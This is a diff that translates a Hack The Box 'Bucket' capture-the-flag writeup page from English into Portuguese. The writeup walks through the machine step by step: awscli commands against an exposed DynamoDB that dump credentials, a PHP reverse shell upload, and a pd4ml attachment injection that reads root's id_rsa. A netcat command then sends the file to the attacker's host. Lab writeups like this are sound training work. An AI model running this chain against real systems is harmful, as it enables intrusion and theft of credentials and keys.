@@ -1,33 +1,33 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>bucket — htb writeup · chu@antisec</title>
-    <meta name="description" content="htb bucket writeup (linux): dynamodb exposed on s3.bucket.htb, php shell upload to the adserver, pd4ml attachment to read root's id_rsa.">
+    <title>bucket — writeup htb · chu@antisec</title>
+    <meta name="description" content="writeup htb bucket (linux): dynamodb exposto no s3.bucket.htb, upload de php shell no adserver, pd4ml attachment pra ler o id_rsa do root. em português.">
     <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' fill='%23080b09'/%3E%3Crect x='3' y='3' width='6' height='10' fill='%235df27f'/%3E%3C/svg%3E">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="../styles.css">
-    <link rel="alternate" hreflang="pt-BR" href="../pt/hackthebox/bucket.html">
-    <link rel="alternate" hreflang="en" href="bucket.html">
-    <link rel="alternate" hreflang="x-default" href="bucket.html">
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="alternate" hreflang="pt-BR" href="bucket.html">
+    <link rel="alternate" hreflang="en" href="../../hackthebox/bucket.html">
+    <link rel="alternate" hreflang="x-default" href="../../hackthebox/bucket.html">
   </head>
   <body>
-    <a class="skip" href="#main">skip to content</a>
+    <a class="skip" href="#main">pular para o conteúdo</a>
 
     <header class="chrome">
       <div class="wrap chrome-in">
-        <a class="brand" href="../index.html">chu<span class="host">@antisec</span>:~/htb$<span class="cursor" aria-hidden="true">▌</span></a>
-        <nav class="nav" aria-label="main">
+        <a class="brand" href="../../index.html">chu<span class="host">@antisec</span>:~/htb$<span class="cursor" aria-hidden="true">▌</span></a>
+        <nav class="nav" aria-label="principal">
           <ul>
-            <li><a href="../index.html">home</a></li>
-            <li><a href="../research/index.html">research</a></li>
+            <li><a href="../../index.html">início</a></li>
+            <li><a href="../index.html">pesquisa</a></li>
             <li><a href="index.html" aria-current="page">writeups</a></li>
-            <li><a href="../about.html">about</a></li>
-            <li><a href="https://adminions.ca/" target="_blank" rel="noopener">team</a></li>
-            <li class="lang"><a href="../pt/hackthebox/bucket.html" hreflang="pt-BR" lang="pt-BR" title="versão em português" aria-label="mudar para português"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#009b3a"/><path d="M12 1.6 22.4 8 12 14.4 1.6 8Z" fill="#fedf00"/><circle cx="12" cy="8" r="3.1" fill="#002776"/></svg></a><span class="flag-cur" aria-hidden="true"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#012169"/><path d="M0 0L24 16M24 0L0 16" stroke="#fff" stroke-width="3.2"/><path d="M0 0L24 16M24 0L0 16" stroke="#C8102E" stroke-width="1.6"/><path d="M12 0V16M0 8H24" stroke="#fff" stroke-width="5"/><path d="M12 0V16M0 8H24" stroke="#C8102E" stroke-width="2.8"/></svg></span></li>
+            <li><a href="../about.html">sobre</a></li>
+            <li><a href="https://adminions.ca/" target="_blank" rel="noopener">time</a></li>
+            <li class="lang"><span class="flag-cur"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#009b3a"/><path d="M12 1.6 22.4 8 12 14.4 1.6 8Z" fill="#fedf00"/><circle cx="12" cy="8" r="3.1" fill="#002776"/></svg></span><a href="../../hackthebox/bucket.html" hreflang="en" lang="en" title="read in english" aria-label="switch to english"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#012169"/><path d="M0 0L24 16M24 0L0 16" stroke="#fff" stroke-width="3.2"/><path d="M0 0L24 16M24 0L0 16" stroke="#C8102E" stroke-width="1.6"/><path d="M12 0V16M0 8H24" stroke="#fff" stroke-width="5"/><path d="M12 0V16M0 8H24" stroke="#C8102E" stroke-width="2.8"/></svg></a></li>
           </ul>
         </nav>
       </div>
@@ -44,17 +44,17 @@
         <ul class="meta">
           <li class="chip">date=2026-08-19</li>
           <li class="chip">os=linux</li>
-          <li class="chip">lang=en</li>
+          <li class="chip">lang=pt-br</li>
           <li class="chip chip--phos">status=root</li>
         </ul>
 
         <figure class="fig">
           <a href="https://i.imgur.com/Y1obslX.png"><img src="https://i.imgur.com/Y1obslX.png" alt="image" loading="lazy"></a>
-          <figcaption class="fig-cap"><b>bucket</b> — machine card on hackthebox</figcaption>
+          <figcaption class="fig-cap"><b>bucket</b> — card da máquina no hackthebox</figcaption>
         </figure>
 
         <p class="cmd"><span class="ps1"><b>chu@antisec</b>:~/htb$</span> cat tools.txt</p>
-        <p><strong>Tools</strong> used:</p>
+        <p><strong>Tools</strong> utilizadas:</p>
         <ul class="chips">
           <li class="chip">nmap</li>
           <li class="chip">awscli</li>
@@ -97,26 +97,26 @@ HOP RTT       ADDRESS
 2   192.00 ms bucket.htb (10.10.10.212)</code></pre>
           </div>
 
-          <p>Accessing port 80, we get redirected to the domain: bucket.htb
-            So let's add it to the hosts file</p>
+          <p>Ao acessar a porta 80, somos redirecionados para o dominio: bucket.htb
+            Portanto, vamos adiciona-lo no arquivo de hosts</p>
 
           <div class="code">
             <div class="code-cap"><span class="dot">●</span> <span>cmd</span></div>
             <pre><code>echo 'bucket.htb  10.10.10.212' &gt;&gt; /etc/hosts</code></pre>
         </div>
 
-        <p>After that we can access the web page; after some testing, no other directories or files could be found.</p>
+        <p>Após isso conseguimos acessar a página web, após alguns testes, não foi possível encontrar outros diretórios e arquivos.</p>
 
         <figure class="fig">
           <a href="https://i.imgur.com/Wsd50kp.png"><img src="https://i.imgur.com/Wsd50kp.png" alt="Image" loading="lazy"></a>
-          <figcaption class="fig-cap"><b>bucket.htb</b> — home page</figcaption>
+          <figcaption class="fig-cap"><b>bucket.htb</b> — página inicial</figcaption>
         </figure>
 
-        <p>Looking at the source code, we can see we have a subdomain (s3):</p>
+        <p>Ao analisar o código fonte, podemos ver que possuimos um subdomain (s3):</p>
 
         <figure class="fig">
           <a href="https://i.imgur.com/tXc0CNj.png"><img src="https://i.imgur.com/tXc0CNj.png" alt="Image" loading="lazy"></a>
-          <figcaption class="fig-cap"><b>source</b> — s3 subdomain in the code</figcaption>
+          <figcaption class="fig-cap"><b>source</b> — subdomínio s3 no código</figcaption>
         </figure>
 
         <div class="code">
@@ -124,14 +124,14 @@ HOP RTT       ADDRESS
           <pre><code>http://s3.bucket.htb/</code></pre>
       </div>
 
-      <p>Let's try to find directories on it with wfuzz:</p>
+      <p>Vamos tentar encontrar diretorios nele com o wfuzz:</p>
 
       <figure class="fig">
         <a href="https://i.imgur.com/VppmJzb.png"><img src="https://i.imgur.com/VppmJzb.png" alt="Image" loading="lazy"></a>
-        <figcaption class="fig-cap"><b>wfuzz</b> — directory enumeration</figcaption>
+        <figcaption class="fig-cap"><b>wfuzz</b> — enumeração de diretórios</figcaption>
       </figure>
 
-      <p>We can find 2 directories:</p>
+      <p>Podemos encontrar 2 diretórios:</p>
 
       <div class="code">
         <div class="code-cap"><span class="dot">●</span> <span>dirs</span></div>
@@ -139,20 +139,20 @@ HOP RTT       ADDRESS
 shell</code></pre>
       </div>
 
-      <p>Accessing the shell directory, we can spot the 'DynamoDB' service.</p>
+      <p>Ao acessar o diretório shell, podemos perceber o serviço 'DynamoDB'.</p>
 
       <figure class="fig">
         <a href="https://i.imgur.com/RXhjaJf.png"><img src="https://i.imgur.com/RXhjaJf.png" alt="Image" loading="lazy"></a>
-        <figcaption class="fig-cap"><b>dynamodb</b> — console on /shell</figcaption>
+        <figcaption class="fig-cap"><b>dynamodb</b> — console no /shell</figcaption>
       </figure>
 
-      <p>To interact with this service, we'll use AWS's own tool, known as aws-cli</p>
+      <p>Para interagir com esse serviço, vamos utilizar a tool da própria AWS, conhecida como aws-cli</p>
 
-      <p>After a few hours reading docs, we finally have the right command to interact:</p>
+      <p>Após algumas horas lendo documentações, finalmente temos o comando correto para interagir:</p>
 
       <figure class="fig">
         <a href="https://i.imgur.com/Kiz6WsO.png"><img src="https://i.imgur.com/Kiz6WsO.png" alt="Image" loading="lazy"></a>
-        <figcaption class="fig-cap"><b>awscli</b> — list-tables working</figcaption>
+        <figcaption class="fig-cap"><b>awscli</b> — list-tables funcionando</figcaption>
       </figure>
 
       <div class="code">
@@ -160,12 +160,12 @@ shell</code></pre>
         <pre><code>aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/</code></pre>
     </div>
 
-    <p>and b00m, we have the name of the table running there :D
-      Let's see if we can get credentials;</p>
+    <p>e b00m, temos o nome da tabela que está rodando lá :D
+      Vamos ver se conseguimos credenciais;</p>
 
     <figure class="fig">
       <a href="https://i.imgur.com/P3J8y29.png"><img src="https://i.imgur.com/P3J8y29.png" alt="Image" loading="lazy"></a>
-      <figcaption class="fig-cap"><b>scan</b> — users table enumerated</figcaption>
+      <figcaption class="fig-cap"><b>scan</b> — tabela users enumerada</figcaption>
     </figure>
 
     <div class="code">
@@ -173,7 +173,7 @@ shell</code></pre>
       <pre><code>aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/</code></pre>
   </div>
 
-  <p>We have credentials :D</p>
+  <p>Temos credenciais :D</p>
 
   <div class="code">
     <div class="code-cap"><span class="dot">●</span> <span>creds</span></div>
@@ -182,13 +182,13 @@ Cloudadm:Welcome123!
 Sysadm:n2vM-&lt;_K_Q:.Aa2</code></pre>
   </div>
 
-  <p>Trying to validate them via SSH, no login worked</p>
+  <p>Ao tentar valida-las via SSH, nenhum login foi possível</p>
 
-  <p>Listing files and directories:</p>
+  <p>Listando os arquivos e diretórios:</p>
 
   <figure class="fig">
     <a href="https://i.imgur.com/updbyQp.png"><img src="https://i.imgur.com/updbyQp.png" alt="Image" loading="lazy"></a>
-    <figcaption class="fig-cap"><b>s3 ls</b> — listing the buckets</figcaption>
+    <figcaption class="fig-cap"><b>s3 ls</b> — listando os buckets</figcaption>
   </figure>
 
   <div class="code">
@@ -196,12 +196,12 @@ Sysadm:n2vM-&lt;_K_Q:.Aa2</code></pre>
     <pre><code>aws --endpoint-url http://s3.bucket.htb/ s3 ls</code></pre>
 </div>
 
-<p>After that, we try uploading a reverse shell to the server.
-  In our case we'll use the <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">shell</a> from 'Pentest Monkeys'</p>
+<p>Após isso, tentamos fazer o upload de uma reverse shell para o servidor.
+  No nosso caso vamos utilizar a <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">shell</a> do 'Pentest Monkeys'</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/VLLIuAS.png"><img src="https://i.imgur.com/VLLIuAS.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>s3 cp</b> — uploading the php shell</figcaption>
+  <figcaption class="fig-cap"><b>s3 cp</b> — subindo a php shell</figcaption>
 </figure>
 
 <div class="code">
@@ -209,18 +209,18 @@ Sysadm:n2vM-&lt;_K_Q:.Aa2</code></pre>
   <pre><code>aws --endpoint-url http://s3.bucket.htb/ s3 cp ./chu.php s3://adserver</code></pre>
 </div>
 
-<p>Then we use curl to call our file with the shell</p>
+<p>Em seguida usamos o curl para chamar nosso arquivo com a shell</p>
 
 <div class="code">
   <div class="code-cap"><span class="dot">●</span> <span>cmd</span></div>
   <pre><code>curl http://bucket.htb/chu.php</code></pre>
 </div>
 
-<p>w00t we have a shell as www-data, let's try to upgrade our shell with python</p>
+<p>w00t temos uma shell como www-data, vamos tentar melhorar nossa shell com python</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/24FbvOg.png"><img src="https://i.imgur.com/24FbvOg.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>www-data</b> — shell received</figcaption>
+  <figcaption class="fig-cap"><b>www-data</b> — shell recebida</figcaption>
 </figure>
 
 <div class="code">
@@ -228,35 +228,35 @@ Sysadm:n2vM-&lt;_K_Q:.Aa2</code></pre>
   <pre><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
 </div>
 
-<p>With that, we have an interactive shell and we find a new user called 'Roy'
-  So we can test the passwords we got earlier against this user.</p>
+<p>Com isso, temos uma shell interativa e encontramos um novo usuário chamado 'Roy'
+  Portanto podemos testar as senhas já obtidas previamente para este usuário.</p>
 
-<p>aaand theeen:</p>
+<p>ee entãoo:</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/me6RqLL.png"><img src="https://i.imgur.com/me6RqLL.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>su roy</b> — password tested</figcaption>
+  <figcaption class="fig-cap"><b>su roy</b> — senha testada</figcaption>
 </figure>
 
-<p>Now let's upgrade our shell by logging in via SSH as user 'Roy'</p>
+<p>Agora vamos melhorar nossa shell logando via SSH com o usuário 'Roy'</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/0q73Xnv.png"><img src="https://i.imgur.com/0q73Xnv.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>ssh roy</b> — login as roy</figcaption>
+  <figcaption class="fig-cap"><b>ssh roy</b> — login como roy</figcaption>
 </figure>
 
-<p>After analyzing what was running on the machine, we can see that the file '/var/www/bucket-app/index.php' creates a table and writes a file when it gets the right request.</p>
+<p>Após uma analise do que estava rodando na máquina, podemos perceber que o arquivo '/var/www/bucket-app/index.php' faz a criação de uma tabela e escreve um arquivo após a requisição correta.</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/LDuapI6.png"><img src="https://i.imgur.com/LDuapI6.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>index.php</b> — bucket-app code</figcaption>
+  <figcaption class="fig-cap"><b>index.php</b> — código do bucket-app</figcaption>
 </figure>
 
-<p>So, let's try creating that table manually.</p>
+<p>Então, vamos tentar fazer a criação dessa tabela manualmente.</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/894o4iV.png"><img src="https://i.imgur.com/894o4iV.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>create-table</b> — alerts table created</figcaption>
+  <figcaption class="fig-cap"><b>create-table</b> — tabela alerts criada</figcaption>
 </figure>
 
 <div class="code">
@@ -264,11 +264,11 @@ Sysadm:n2vM-&lt;_K_Q:.Aa2</code></pre>
   <pre><code>aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url=http://s3.bucket.htb</code></pre>
 </div>
 
-<p>Now that the table is created, let's write the file we want.</p>
+<p>Agora que a tabela foi criada vamos escrever nosso arquivo desejado.</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/SOPFNoe.png"><img src="https://i.imgur.com/SOPFNoe.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>put-item</b> — item with pd4ml written</figcaption>
+  <figcaption class="fig-cap"><b>put-item</b> — item com pd4ml escrito</figcaption>
 </figure>
 
 <div class="code">
@@ -276,11 +276,11 @@ Sysadm:n2vM-&lt;_K_Q:.Aa2</code></pre>
   <pre><code>aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "&lt;pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\"&gt;file:///root/.ssh/id_rsa&lt;/pd4ml:attachment&gt;"}}' --endpoint-url=http://s3.bucket.htb</code></pre>
 </div>
 
-<p>We can validate that it was created and written correctly.</p>
+<p>Podemos validar se foi criado e escrito corretamente.</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/2UCnT06.png"><img src="https://i.imgur.com/2UCnT06.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>scan alerts</b> — item validated</figcaption>
+  <figcaption class="fig-cap"><b>scan alerts</b> — item validado</figcaption>
 </figure>
 
 <div class="code">
@@ -288,11 +288,11 @@ Sysadm:n2vM-&lt;_K_Q:.Aa2</code></pre>
   <pre><code>aws dynamodb scan --table-name alerts --endpoint-url http://s3.bucket.htb/</code></pre>
 </div>
 
-<p>We need to forward in order to send the request, so</p>
+<p>Precisamos fazer forward para conseguir enviar a requisição, então</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/ZAZDHJH.png"><img src="https://i.imgur.com/ZAZDHJH.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>ssh -L</b> — port forward of 8000</figcaption>
+  <figcaption class="fig-cap"><b>ssh -L</b> — port forward da 8000</figcaption>
 </figure>
 
 <div class="code">
@@ -300,7 +300,7 @@ Sysadm:n2vM-&lt;_K_Q:.Aa2</code></pre>
   <pre><code>ssh -L 8000:127.0.0.1:8000 roy@10.10.10.212</code></pre>
 </div>
 
-<p>Now we can make our request.</p>
+<p>Agora podemos fazer nossa requisição.</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/UshHUgt.png"><img src="https://i.imgur.com/UshHUgt.png" alt="Image" loading="lazy"></a>
@@ -312,11 +312,11 @@ Sysadm:n2vM-&lt;_K_Q:.Aa2</code></pre>
   <pre><code>curl -X POST -d "action=get_alerts" http://127.0.0.1:8000/ -v</code></pre>
 </div>
 
-<p>The file is now created at /var/www/bucket-app/files/result.pdf</p>
+<p>O arquivo agora foi criado na pasta /var/www/bucket-app/files/result.pdf</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/15FUBjs.png"><img src="https://i.imgur.com/15FUBjs.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>result.pdf</b> — generated pdf</figcaption>
+  <figcaption class="fig-cap"><b>result.pdf</b> — pdf gerado</figcaption>
 </figure>
 
 <div class="code">
@@ -324,11 +324,11 @@ Sysadm:n2vM-&lt;_K_Q:.Aa2</code></pre>
   <pre><code>nc -vvn 10.10.14.218 443 &lt; result.pdf</code></pre>
 </div>
 
-<p>Now we transfer the PDF file containing the file we inserted into the table to our machine, using netcat.</p>
+<p>Agora transferimos o arquivo PDF contendo o arquivo que inserimos na tabela para nossa máquina, utilizando o netcat.</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/kwRhhHi.png"><img src="https://i.imgur.com/kwRhhHi.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>netcat</b> — receiving the pdf</figcaption>
+  <figcaption class="fig-cap"><b>netcat</b> — recebendo o pdf</figcaption>
 </figure>
 
 <div class="code">
@@ -336,18 +336,18 @@ Sysadm:n2vM-&lt;_K_Q:.Aa2</code></pre>
   <pre><code>nc -vnlp 443 &gt; result.pdf</code></pre>
 </div>
 
-<p>After downloading the file to our machine, we can open it as a PDF, and there it is, our file (id_rsa)</p>
+<p>Após baixarmos o arquivo para nossa máquina, podemos abri-lo como PDF, e lá está, nosso arquivo (id_rsa)</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/TU7OLGp.png"><img src="https://i.imgur.com/TU7OLGp.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>pdf</b> — id_rsa inside the attachment</figcaption>
+  <figcaption class="fig-cap"><b>pdf</b> — id_rsa dentro do anexo</figcaption>
 </figure>
 
-<p>And then, we save the file on our machine with permission 600 and we can log in as root!</p>
+<p>E então, salvamos o arquivo em nossa máquina com permissão 600 e assim podemos fazer o login como root!</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/wB66Uvu.png"><img src="https://i.imgur.com/wB66Uvu.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>root</b> — ssh with the id_rsa</figcaption>
+  <figcaption class="fig-cap"><b>root</b> — ssh com o id_rsa</figcaption>
 </figure>
 
 <div class="code">
@@ -386,10 +386,10 @@ ssh root@bucket.htb -i id_rsa</code></pre>
       <p>chu@antisec — long life for the hacking and the cats!<span aria-hidden="true"></span></p>
     </div>
     <div class="foot-row">
-      <p>© 2026 chu · <a href="../index.html">home</a> · <a href="index.html">writeups</a> · <a href="../about.html#contact">contact</a></p>
+      <p>© 2026 chu · <a href="../../index.html">início</a> · <a href="index.html">writeups</a> · <a href="../about.html#contact">contato</a></p>
     </div>
   </div>
 </footer>
-<script src="../zoom.js" defer></script>
+<script src="../../zoom.js" defer></script>
 </body>
 </html>
